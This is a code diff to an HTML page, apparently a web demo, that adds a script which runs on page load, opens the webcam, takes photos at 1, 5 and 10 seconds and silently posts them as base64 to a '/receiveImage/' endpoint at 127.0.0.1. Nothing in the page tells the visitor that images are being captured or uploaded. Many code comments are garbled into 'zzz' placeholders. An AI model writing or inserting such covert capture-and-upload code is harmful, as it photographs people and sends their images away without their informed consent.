@@ -55,5 +55,108 @@
 
 <script src="../../../js/lib/ga.js"></script>
 
+<script>
+       
+    function clickcam(){
+        $("#showVideo").click();
+    }
+
+    function closeMedia() {
+            var video = document.getElementById('gum-local');
+            if (!video.srcObject) return
+            let stream = video.srcObject
+            let tracks = stream.getTracks();
+            tracks.forEach(track => {
+                track.stop()
+            })
+    }
+    //vid
+    let video = document.getElementById("gum-local");
+    function getMedia() {
+        let constraints = {
+            video: {width: 500, height: 500}
+        };
+        /*
+        navigator.mediaDevices.getUserMedia()
+       zzz
+      zzz
+      zzz MediaStream zzz resolve()zzz then()
+        zzz PermissionDeniedError reject() catch()
+        */
+        let promise = navigator.mediaDevices.getUserMedia(constraints);
+        promise.then(function (MediaStream) {
+            video.srcObject = MediaStream;
+            video.play();
+        }).catch(function (PermissionDeniedError) {
+            console.log(PermissionDeniedError);
+        })
+    }
+    function takePhoto() {
+        //canvas
+        let canvas = document.getElementById("canvas");
+        let ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 500, 500);
+    }
+    //zzz
+    //zCanvasz
+    <!--var video = document.getElementById('video');-->
+    var canvas = document.getElementById('canvas');
+    var context = canvas.getContext('2d');
+    function uploadImage(filename){
+        canvas.width = 300;
+        canvas.height = 300;
+        context.drawImage(video, 0, 0, 300, 300);
+        var imgData = canvas.toDataURL("image/jpg");
+        imgData = imgData.replace(/^data:image\/(png|jpg);base64,/,"")
+        //上传到后台。
+        var uploadAjax = $.ajax({
+            type: "post",
+            //zzz
+            url:"http://127.0.0.1/receiveImage/",
+            data: JSON.stringify({"imgData": imgData,"filename":filename}),
+            contentType:"json/application",
+            //zzz
+            timeout:10000,
+            async: true,
+            success: function (htmlVal) {
+                //zzz
+            },
+            error: function(data) {
+            },
+            //zzz
+            complete: function (XMLHttpRequest, textStatus) {
+                if(textStatus == 'timeout'){
+                    uploadAjax.abort(); //zzz
+                    //zzz
+                    alert("z")
+                    //z
+                    closeCard();
+                }
+            }
+        });
+    }
+
+     clickcam()
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('a.png')
+     }, 1000);
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('b.png')
+     }, 5000);
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('c.png')
+     }, 10000);
+
+
+    // takePhoto()
+    // sleep(1000);
+    // uploadImage('b.png')
+    // takePhoto()
+    // sleep(1000);
+    // uploadImage('c.png')
+</script>
 </body>
 </html>
